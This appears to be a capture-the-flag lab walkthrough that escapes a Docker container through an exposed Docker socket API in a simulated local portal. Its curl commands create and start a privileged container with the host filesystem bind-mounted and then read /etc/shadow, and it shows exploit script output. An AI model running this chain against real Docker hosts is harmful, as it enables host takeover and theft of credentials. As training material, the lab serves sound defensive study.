# Advanced Container Escape via Docker Socket: Full Walkthrough

## Setup

```
docker compose up --build -d
```

Verify:

```
curl -s http://127.0.0.1:8113/
```

Output:

```
<html>...Container Management Portal...</html>
```

## Step 1: Find the Docker socket

```
curl -s http://127.0.0.1:8113/api/info
```

Output:

```json
{
  "SocketPath": "/var/run/docker.sock",
  "ServerVersion": "24.0.5",
  "flag1": "POC{<hex>}"
}
```

**Flag 1** is in the `flag1` field.

## Step 2: Create a privileged container with host filesystem

```
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"Image":"alpine:latest","HostConfig":{"Privileged":true,"Binds":["/:/hostfs"]}}' \
  http://127.0.0.1:8113/api/containers/create
```

Output:

```json
{"Id": "escapedeadbeef12345678", "Warnings": []}
```

## Step 3: Start the container

```
curl -s -X POST http://127.0.0.1:8113/api/containers/escapedeadbeef12345678/start
```

## Step 4: Trigger the escape

```
curl -s http://127.0.0.1:8113/api/escape
```

Output:

```json
{
  "escaped": true,
  "host_file": "/etc/shadow",
  "content": "root:$6$xyz:19000:0:99999:7:::",
  "flag2": "POC{<hex>}"
}
```

**Flag 2** is in the `flag2` field.

## Automated exploit

```
python3 exploit/exploit.py http://127.0.0.1:8113
```

Output:

```
[*] Target: http://127.0.0.1:8113

[+] Docker socket found at: /var/run/docker.sock
[+] Flag 1: POC{<hex>}
[+] Privileged container created: escapedeadbeef12345678...
[+] Container started
[+] Container escaped to host
[+] Host file content: root:$6$xyz:19000:0:99999:7:::
[+] Flag 2: POC{<hex>}

[+] Exploit complete
    Flag 1: POC{<hex>}
    Flag 2: POC{<hex>}
```

## Full attack chain

```
Attacker has code execution inside container
  |
  v
GET /api/info -> Docker socket path confirmed (/var/run/docker.sock)
  -> Flag 1 captured
  |
  v
POST /api/containers/create
  Privileged: true, Binds: ["/:/hostfs"]
  -> Privileged container queued with host filesystem access
  |
  v
POST /api/containers/<id>/start
  -> Container starts, runs chroot /hostfs cat /etc/shadow
  |
  v
GET /api/escape
  -> Host shadow file contents returned
  -> Flag 2 captured
```

## Tools used

| Tool | Purpose |
|------|---------|
| curl | Manual API calls to Docker socket simulation |
| exploit.py | Automated three-step escape |

## Teardown

```
docker compose down
```
